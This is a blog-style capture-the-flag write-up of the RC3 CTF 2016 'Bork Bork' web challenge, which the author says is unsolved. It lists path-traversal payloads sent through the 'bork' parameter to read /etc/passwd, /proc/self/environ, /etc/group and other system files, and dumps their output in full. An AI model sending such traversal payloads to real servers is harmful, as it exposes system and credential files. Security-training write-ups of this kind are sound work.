@@ -1,0 +1,543 @@
+---
+layout: post
+title: "RC3 CTF - 300 - Bork Bork - Web"
+lang: en
+categories:
+  - security
+  - writeups
+tags:
+  - security
+  - writeups
+  - ctf
+  - web
+date: 2016/11/21
+thumbnail: /images/ctf.png
+---
+## Informations
+
+### Version
+
+| By    | Version | Comment
+| ---   | ---     | ---
+| noraj | 1.0     | Creation
+
+### CTF
+
+- **Name** : RC3 CTF 2016
+- **Website** : [http://ctf.rc3.club/](http://ctf.rc3.club/)
+- **Type** : Online
+- **Format** : Jeopardy
+- **CTF Time** : [link](https://ctftime.org/event/389)
+
+### Description
+
+> UPDATE: We have made changes to this challenge to make it (somewhat) stable. If what you were trying before is not working, it's because it was causing a problem for us on the back end. I assure you that what you were doing was not the easiest solution, anyway.
+>
+> We all love doggos and puppers. Have some more of one of our favorite puppers, Gabe. Bork.
+>
+> https://ctf.rc3.club:3100/
+>
+> author:orkulus
+
+## Solution
+
+**TL;DR**: Warning, this is an incomplete writeup, we didn't solve this challenge.
+
+We can see the server is not an apache or nginx: `Server: Werkzeug/0.11.11 Python/2.7.12`.
+
+The dropdown menu is used to select a file (`something.txt`). The server use `cat` to read it en write its content into the `src` attribute of a video balise.
+
+So we will try to disclose some system files into this `src` with the `bork` POST attribute.
+
+So let's see the behaviour with:
+
+bork=test.txt
+`<iframe width="854" height="480" src="cat: borks/test.txt: No such file or directory?autoplay=1&loop=1" frameborder="0"></iframe>`
+
+bork=../../../../../etc/passwd
+```
+<iframe width="854" height="480" src="root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+ctfuser:x:1001:1001::/home/ctfuser:?autoplay=1&loop=1" frameborder="0"></iframe>
+```
+
+bork=../../../../../proc/self/environ
+```
+/LESSOPEN=|%20/usr/bin/lesspipe%20%s%EF%BF%BDPYTHONIOENCODING=UTF-8%EF%BF%BDTMUX=/tmp/tmux-1000/default,2791,1%EF%BF%BDMAIL=/var/mail/ctfuser%EF%BF%BDSSH_CLIENT=192.168.0.104%2038572%2022%EF%BF%BDUSER=ctfuser%EF%BF%BDSHLVL=4%EF%BF%BDHOME=/home/ctfuser%EF%BF%BDSSH_TTY=/dev/pts/4%EF%BF%BDLOGNAME=ctfuser%EF%BF%BDEVENT_NOEPOLL=1%EF%BF%BD_=/usr/bin/python%EF%BF%BDXDG_SESSION_ID=9%EF%BF%BDTERM=screen-256color%EF%BF%BDPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games%EF%BF%BDXDG_RUNTIME_DIR=/run/user/1000%EF%BF%BDLANG=en_US.UTF-8%EF%BF%BDLS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:%EF%BF%BDSHELL=/bin/bash%EF%BF%BDLESSCLOSE=/usr/bin/lesspipe%20%s%20%s%EF%BF%BDPWD=/home/ctfuser/Web-300/app%EF%BF%BDSSH_CONNECTION=192.168.0.104%2057282%20192.168.30.121%2022%EF%BF%BDTMUX_PANE=%4%EF%BF%BD
+```
+
+urldecode
+```
+/LESSOPEN=| /usr/bin/lesspipe %sï¿½PYTHONIOENCODING=UTF-8ï¿½TMUX=/tmp/tmux-1000/default,2791,1ï¿½MAIL=/var/mail/ctfuserï¿½SSH_CLIENT=192.168.0.104 38572 22ï¿½USER=ctfuserï¿½SHLVL=4ï¿½HOME=/home/ctfuserï¿½SSH_TTY=/dev/pts/4ï¿½LOGNAME=ctfuserï¿½EVENT_NOEPOLL=1ï¿½_=/usr/bin/pythonï¿½XDG_SESSION_ID=9ï¿½TERM=screen-256colorï¿½PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamesï¿½XDG_RUNTIME_DIR=/run/user/1000ï¿½LANG=en_US.UTF-8ï¿½LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:ï¿½SHELL=/bin/bashï¿½LESSCLOSE=/usr/bin/lesspipe %s %sï¿½PWD=/home/ctfuser/Web-300/appï¿½SSH_CONNECTION=192.168.0.104 57282 192.168.30.121 22ï¿½TMUX_PANE=%4ï¿½
+```
+
+bork=../../../../../etc/group
+
+```
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog,ubuntu
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:ubuntu
+fax:x:21:
+voice:x:22:
+cdrom:x:24:ubuntu
+floppy:x:25:ubuntu
+tape:x:26:
+sudo:x:27:ubuntu
+audio:x:29:ubuntu
+dip:x:30:ubuntu
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:ubuntu
+sasl:x:45:
+plugdev:x:46:ubuntu
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-timesync:x:102:
+systemd-network:x:103:
+systemd-resolve:x:104:
+systemd-bus-proxy:x:105:
+input:x:106:
+crontab:x:107:
+syslog:x:108:
+netdev:x:109:ubuntu
+lxd:x:110:ubuntu
+messagebus:x:111:
+uuidd:x:112:
+mlocate:x:113:
+ssh:x:114:
+admin:x:115:
+ubuntu:x:1000:
+docker:x:116:ubuntu
+ctfuser:x:1001:
+```
+
+bork=../../../../../etc/issue : `Ubuntu 16.04.1 LTS \n \l`
+
+bork=../../../../../proc/version : `Linux version 4.4.0-47-generic (buildd@lcy01-03) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.2) ) #68-Ubuntu SMP Wed Oct 26 19:39:52 UTC 2016`
+
+bork=../../../../../etc/profile :
+
+```
+"# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
+# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).
+
+if [ &#34;$PS1&#34; ]; then
+  if [ &#34;$BASH&#34; ] &amp;&amp; [ &#34;$BASH&#34; != &#34;/bin/sh&#34; ]; then
+    # The file bash.bashrc already sets the default PS1.
+    # PS1=&#39;\h:\w\$ &#39;
+    if [ -f /etc/bash.bashrc ]; then
+      . /etc/bash.bashrc
+    fi
+  else
+    if [ &#34;`id -u`&#34; -eq 0 ]; then
+      PS1=&#39;# &#39;
+    else
+      PS1=&#39;$ &#39;
+    fi
+  fi
+fi
+
+if [ -d /etc/profile.d ]; then
+  for i in /etc/profile.d/*.sh; do
+    if [ -r $i ]; then
+      . $i
+    fi
+  done
+  unset i
+fi
+```
+
+bork=../../../../../root/.bash_history : youtube video
+
+bork=../../../../../var/log/dmessage : No such file or directory
+
+bork=../../../../../var/mail/root : No such file or directory
+
+bork=../../../../../var/spool/cron/crontabs/root : Permission denied
+
+bork=../../../../../home/ctfuser/flag.txt : No such file or directory
+
+bork=../../../../../home/ctfuser/Web-300/app/.htaccess : youtube video
+
+bork=../../../../../home/ctfuser/Web-300/app/flag.txt : youtube video
+
+bork=../../../../../usr/bin/lesspipe :
+
+```
+#!/bin/sh
+#
+# lessfile/lesspipe
+# $Id: lessopen,v 1.4 1998/05/12 09:37:46 torin Exp $
+# Plus POSIX sh changes by Y.Dirson
+#
+# Less filter for viewing non text files.
+#
+# Written by: Behan Webster &lt;behanw@pobox.com&gt;
+# Many Modifications by Darren Stalder
+# Further Modifications by Thomas Schoepf &lt;schoepf@debian.org&gt;
+#
+# combined lessfile and lesspipe to avoid duplication of decode stage
+# shell is sure icky.  I&#39;m real tempted to rewrite the whole thing in Perl
+#
+# Unfortunately, this means that I have filename dependencies sprinkled
+# throughout the code.  If you don&#39;t want lessfile to be called that,
+# you&#39;ll need to change the LESSFILE envar below.
+#
+# Usage: eval `lessfile`  or eval `lesspipe`
+#
+# less passes in:
+#    $1  filename to be viewed with less  (used by LESSOPEN)
+# and possibly (if used by lessfile)
+#    $2  filename that was created during LESSOPEN
+
+TMPDIR=${TMPDIR:-/tmp}
+BASENAME=`basename $0`
+LESSFILE=lessfile
+
+# Helper function to list contents of ISO files (CD images)
+iso_list() {
+	isoinfo -d -i &#34;$1&#34;
+	isoinfo -d -i &#34;$1&#34; | grep -q ^Rock\.Ridge &amp;&amp; iiopts=&#34;$iiopts -R&#34;
+	isoinfo -d -i &#34;$1&#34; | grep -q ^Joliet &amp;&amp; iiopts=&#34;$iiopts -J&#34;
+	echo
+	isoinfo -f $iiopts -i &#34;$1&#34;
+}
+
+if [ $# -eq 1 ] ; then
+	# we were called as LESSOPEN
+
+	# if the file doesn&#39;t exist, we don&#39;t do anything
+	if [ ! -r &#34;$1&#34; ]; then
+		exit 0
+	fi
+
+	# generate filename for possible use by lesspipe
+	umask 077
+	if [ $BASENAME = $LESSFILE ]; then
+		TMPFILE=`tempfile -d $TMPDIR -p lessf`
+		if [ -z &#34;$TMPFILE&#34; ]; then
+			echo &gt;&amp;2 &#34;Could not find essential program &#39;tempfile&#39;. Exiting&#34;
+      exit 1
+		fi
+	fi
+
+	(
+		# possibly redirect stdout to a file for lessfile
+		if [ $BASENAME = $LESSFILE ]; then exec &gt; $TMPFILE; fi
+
+		# Allow for user defined filters
+		#if [ -x ~/.lessfilter -a -O ~/.lessfilter ]; then
+		if [ -x ~/.lessfilter ]; then
+			~/.lessfilter &#34;$1&#34;
+			if [ $? -eq 0 ]; then
+				if [ $BASENAME = $LESSFILE ]; then
+					if [ -s $TMPFILE ]; then
+						echo $TMPFILE
+					else
+						rm -f $TMPFILE
+					fi
+				fi
+				exit 0
+			fi
+		fi
+
+		# Decode file for less
+		case `echo &#34;$1&#34; | tr &#39;[:upper:]&#39; &#39;[:lower:]&#39;` in
+			*.a)
+				if [ -x &#34;`which ar`&#34; ]; then ar tv &#34;$1&#34;
+				else echo &#34;No ar available&#34;; fi ;;
+
+			*.arj)
+				if [ -x &#34;`which unarj`&#34; ]; then unarj l &#34;$1&#34;
+				else echo &#34;No unarj available&#34;; fi ;;
+
+			*.tar.bz2)
+				if [ -x &#34;`which bunzip2`&#34; ]; then
+					bunzip2 -dc &#34;$1&#34; | tar tvvf -
+				else echo &#34;No bunzip2 available&#34;; fi ;;
+
+			*.bz)
+				if [ -x &#34;`which bunzip`&#34; ]; then bunzip -c &#34;$1&#34;
+				else echo &#34;No bunzip available&#34;; fi ;;
+
+			*.bz2)
+				if [ -x &#34;`which bunzip2`&#34; ]; then bunzip2 -dc &#34;$1&#34;
+				else echo &#34;No bunzip2 available&#34;; fi ;;
+
+			*.deb|*.udeb|*.ddeb|*.ipk)
+				echo &#34;$1:&#34;; dpkg --info &#34;$1&#34;
+				echo
+				echo &#39;*** Contents:&#39;; dpkg-deb --contents &#34;$1&#34;
+				;;
+
+			*.doc)
+				if [ -x &#34;`which catdoc`&#34; ]; then
+					catdoc &#34;$1&#34;
+				else
+					# no catdoc, read normally if file is text.
+					if ( file &#34;$1&#34; | grep ASCII 2&gt;/dev/null &gt;/dev/null); then
+						cat &#34;$1&#34;
+					else
+						echo &#34;No catdoc available&#34;;
+					fi
+				fi
+				;;
+
+			*.gif|*.jpeg|*.jpg|*.pcd|*.png|*.tga|*.tiff|*.tif)
+				if [ -x &#34;`which identify`&#34; ]; then
+					identify &#34;$1&#34;
+				else
+					echo &#34;No identify available&#34;
+					echo &#34;Install ImageMagick to browse images&#34;
+				fi
+				;;
+
+			*.iso)
+				if [ -x &#34;`which isoinfo`&#34; ]; then iso_list &#34;$1&#34;
+				else
+					echo &#34;No isoinfo available&#34;
+					echo &#34;Install mkisofs to view ISO images&#34;
+				fi
+				;;
+
+			*.bin|*.raw)
+				if [ -x &#34;`which isoinfo`&#34; ]; then
+					file &#34;$1&#34; | grep -q ISO\.9660 &amp;&amp; iso_list &#34;$1&#34;
+				else
+					echo &#34;No isoinfo available&#34;
+					echo &#34;Install mkisofs to view ISO images&#34;
+				fi
+				;;
+
+			*.lha|*.lzh)
+				if [ -x &#34;`which lha`&#34; ]; then lha v &#34;$1&#34;
+				else echo &#34;No lha available&#34;; fi ;;
+
+			*.tar.lz|*.tlz)
+				if [ -x &#34;`which lzip`&#34; ]; then
+					lzip -dc &#34;$1&#34; | tar tvvf -
+				elif [ -x &#34;`which lunzip`&#34; ]; then
+					lunzip -dc &#34;$1&#34; | tar tvvf -
+				else echo &#34;No lzip or lunzip available&#34;; fi ;;
+
+			*.lz)
+				if [ -x &#34;`which lzip`&#34; ]; then lzip -dc &#34;$1&#34;
+				elif [ -x &#34;`which lunzip`&#34; ]; then lunzip -dc &#34;$1&#34;
+				else echo &#34;No lzip or lunzip available&#34;; fi ;;
+
+			*.tar.lzma)
+				if [ -x &#34;`which lzma`&#34; ]; then
+					lzma -dc &#34;$1&#34; | tar tfvv -
+				else
+					echo &#34;No lzma available&#34;
+				fi
+				;;
+
+			*.lzma)
+				if [ -x &#34;`which lzma`&#34; ]; then
+					lzma -dc &#34;$1&#34;
+				else
+					echo &#34;No lzma available&#34;
+				fi
+				;;
+
+			*.pdf)
+				if [ -x &#34;`which pdftotext`&#34; ]; then pdftotext -layout &#34;$1&#34; -
+				else echo &#34;No pdftotext available&#34;; fi ;;
+
+			*.rar|*.r[0-9][0-9])
+				if [ -x &#34;`which rar`&#34; ]; then rar v &#34;$1&#34;
+				elif [ -x &#34;`which unrar`&#34; ]; then unrar v &#34;$1&#34;
+				else echo &#34;No rar or unrar available&#34;; fi ;;
+
+			*.rpm)
+				if [ -x &#34;`which rpm`&#34; ]; then
+					echo &#34;$1:&#34;; rpm -q -i -p &#34;$1&#34;
+					echo
+					echo &#39;*** Contents:&#39;
+					rpm -q -l -p &#34;$1&#34;
+				else echo &#34;rpm isn&#39;t available, no query on rpm package possible&#34;; fi ;;
+
+			*.tar.gz|*.tgz|*.tar.z|*.tar.dz)
+				tar tzvf &#34;$1&#34; --force-local
+				;;
+
+			*.tar.xz|*.txz)
+				if [ -x &#34;`which xz`&#34; ]; then
+					xz -dc &#34;$1&#34; | tar tfvv -
+				else
+					echo &#34;No xz available&#34;
+				fi
+				;;
+
+			*.xz)
+				if [ -x &#34;`which xz`&#34; ]; then
+					xz -dc &#34;$1&#34;
+				else
+					echo &#34;No xz available&#34;
+				fi
+				;;
+
+			# Note that this is out of alpha order so that we don&#39;t catch
+			# the gzipped tar files.
+			*.gz|*.z|*.dz)
+				gzip -dc &#34;$1&#34; ;;
+
+			*.tar)
+				tar tvf &#34;$1&#34; --force-local
+				;;
+
+			*.jar|*.war|*.ear|*.xpi|*.zip)
+				if [ -x &#34;`which unzip`&#34; ]; then unzip -v &#34;$1&#34;;
+				elif [ -x &#34;`which miniunzip`&#34; ]; then miniunzip -l &#34;$1&#34;;
+				elif [ -x &#34;`which miniunz`&#34; ]; then miniunz -l &#34;$1&#34;;
+				else echo &#34;No unzip, miniunzip or miniunz available&#34;; fi ;;
+
+			*.7z)
+				if [ -x &#34;`which 7za`&#34; ]; then 7za l &#34;$1&#34;;
+                                elif [ -x &#34;`which 7zr`&#34; ]; then 7zr l &#34;$1&#34;;
+				else echo &#34;No 7za or 7zr available&#34;; fi ;;
+
+			*.zoo)
+				if [ -x &#34;`which zoo`&#34; ]; then zoo v &#34;$1&#34;;
+				elif [ -x &#34;`which unzoo`&#34; ]; then unzoo -l &#34;$1&#34;;
+				else echo &#34;No unzoo or zoo available&#34;; fi ;;
+
+		esac
+	) 2&gt;/dev/null
+
+	if [ $BASENAME = $LESSFILE ]; then
+		if [ -s $TMPFILE ]; then
+			echo $TMPFILE
+		else
+			rm -f $TMPFILE
+		fi
+	fi
+
+elif [ $# -eq 2 ] ; then
+	#
+	# we were called as LESSCLOSE
+	# delete the file created if we were lessfile
+	#
+	if [ $BASENAME = $LESSFILE ]; then
+		if [ -n &#34;$BASH&#34; ]; then
+			if [ ! -O &#34;$2&#34; ]; then
+				echo &#34;Error in deleting $2&#34; &gt; /dev/tty
+			fi
+		fi
+
+		if [ -f &#34;$2&#34; ]; then
+			rm -f &#34;$2&#34;
+		else
+			echo &#34;Error in deleting $2&#34; &gt; /dev/tty
+		fi
+	fi
+
+elif [ $# -eq 0 ] ; then
+	#
+	# must setup shell to use LESSOPEN/LESSCLOSE
+	#
+	# I have no idea how some of the more esoteric shells (es, rc) do
+	# things. If they don&#39;t do things in a Bourne manner, send me a patch
+	# and I&#39;ll incorporate it.
+	#
+
+	# first determine the full path of lessfile/lesspipe
+	# if you can determine a better way to do this, send me a patch, I&#39;ve
+	# not shell-scripted for many a year.
+	FULLPATH=`cd \`dirname $0\`;pwd`/$BASENAME
+
+	case &#34;$SHELL&#34; in
+		*csh)
+			if [ $BASENAME = $LESSFILE ]; then
+				echo &#34;setenv LESSOPEN \&#34;$FULLPATH %s\&#34;;&#34;
+				echo &#34;setenv LESSCLOSE \&#34;$FULLPATH %s %s\&#34;;&#34;
+			else
+				echo &#34;setenv LESSOPEN \&#34;| $FULLPATH %s\&#34;;&#34;
+				echo &#34;setenv LESSCLOSE \&#34;$FULLPATH %s %s\&#34;;&#34;
+			fi
+			;;
+		*)
+			if [ $BASENAME = $LESSFILE ]; then
+				echo &#34;export LESSOPEN=\&#34;$FULLPATH %s\&#34;;&#34;
+				echo &#34;export LESSCLOSE=\&#34;$FULLPATH %s %s\&#34;;&#34;
+			else
+				echo &#34;export LESSOPEN=\&#34;| $FULLPATH %s\&#34;;&#34;
+				echo &#34;export LESSCLOSE=\&#34;$FULLPATH %s %s\&#34;;&#34;
+			fi
+			;;
+	esac
+
+	#echo &#34;# If you tried to view a file with a name that starts with &#39;#&#39;, you&#34;
+	#echo &#34;# might see this message instead of the file&#39;s contents.&#34;
+	#echo &#34;# To view the contents, try to put &#39;./&#39; ahead of the filename when&#34;
+	#echo &#34;# calling less.&#34;
+
+else
+	echo &#34;Usage: eval \`$BASENAME\`&#34;
+	exit
+fi
+```
+
+bork=../../../../../tmp/tmux-1000/default : youtube video
+
+bork=../../../../../var/mail/ctfuser : No such file or directory
+
+bork=../../../../../dev/pts/4 : Permission denied
+
+bork=../../../../../home/ctfuser/Web-300/app/bork.py : youtube video
+
+We thought that a logical way to solve the challenge was to display `/etc/passwd` and then some file inside like `flag.txt` or to inject commands like `ls` but that didn't work.
+
+Another way we thought was to leak `/proc/self/environ` and them inject some code with user agent but there was not some `HTTP_USER_AGENT` environment variable.
